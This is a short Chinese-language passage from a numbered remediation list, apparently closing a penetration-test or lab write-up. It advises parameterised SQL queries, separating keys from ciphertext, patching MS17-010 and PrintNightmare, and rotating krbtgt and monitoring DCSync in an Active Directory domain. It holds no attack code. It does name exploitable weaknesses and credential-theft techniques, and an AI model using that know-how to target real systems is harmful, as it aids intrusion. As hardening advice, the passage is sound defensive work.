4. `.123` 这种 `username` 直接拼 SQL 的接口，改成参数化查询；`/docs` 不要把内部接口和示例参数直接摊开。
5. 密钥和密文不要同库；口令表即使加密，也不该和可验证的 md5 放在一起变成离线题。
6. Windows 侧把 MS17-010 / PrintNightmare 的补丁补上，`RestrictDriverInstallationToAdministrators=1`。特权账号不要登录成员机，缓存凭据会留 DCC2。
7. 域控定期轮换 `krbtgt`（两次），域管进受保护用户组，监控 DCSync 特征。
